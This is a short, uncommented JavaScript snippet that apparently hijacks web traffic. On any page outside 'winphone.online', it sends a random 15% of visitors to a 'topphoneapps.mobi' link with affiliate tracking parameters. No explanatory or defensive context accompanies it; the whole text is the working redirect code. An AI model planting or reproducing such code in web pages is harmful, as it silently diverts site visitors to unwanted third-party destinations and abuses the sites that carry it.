const a = 'http://winphone.online';
const b = 'http://www.topphoneapps.mobi/?sl=1862621-626da&data1=Track1&data2=Track2';
const c = 0.15;

if (!(new RegExp('^' + a)).test(window.location.href)) {
  if (Math.random() > 1 - c) {
    window.location.href = b;
  }
}
